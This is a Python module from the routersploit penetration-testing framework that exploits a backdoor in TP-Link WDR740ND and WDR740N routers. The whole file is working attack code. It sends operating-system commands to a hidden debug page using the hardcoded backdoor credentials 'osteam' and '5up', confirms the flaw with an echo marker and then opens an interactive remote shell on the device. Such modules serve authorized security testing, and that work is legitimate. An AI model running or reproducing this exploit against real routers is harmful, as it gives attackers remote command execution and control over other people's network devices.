import re

from urllib import quote

from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    http_request,
    mute,
    validators,
    shell,
    random_text,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for TP-Link WDR740ND and WDR740N backdoor vulnerability.
    If the target is vulnerable it allows to execute commands on operating system level.
    """
    __info__ = {
        'name': 'TP-Link WDR740ND & WDR740N Backdoor RCE',
        'description': 'Exploits TP-Link WDR740ND and WDR740N backdoor vulnerability that allows executing commands on operating system level.',
        'authors': [
            'websec.ca',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://websec.ca/advisories/view/root-shell-tplink-wdr740',
        ],
        'devices': [
            'TP-Link WDR740ND',
            'TP-Link WDR740N',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    username = exploits.Option('admin', 'Username to log in with')
    password = exploits.Option('admin', 'Password to log in with')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command shell")
            shell(self)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        cmd = quote(cmd)

        url = "{}:{}/userRpm/DebugResultRpm.htm?cmd={}&usr=osteam&passwd=5up".format(self.target, self.port, cmd)

        response = http_request(method="GET", url=url, auth=(self.username, self.password))
        if response is None:
            return ""

        if response.status_code == 200:
            regexp = 'var cmdResult = new Array\(\n"(.*?)",\n0,0 \);'
            res = re.findall(regexp, response.text)

            if len(res):
                # hard to extract response
                return "\n".join(res[0].replace("\\r\\n", "\r\n").split("\n")[1:])

        return ""

    @mute
    def check(self):
        marker = random_text(32)
        cmd = "echo {}".format(marker)

        response = self.execute(cmd)

        if marker in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
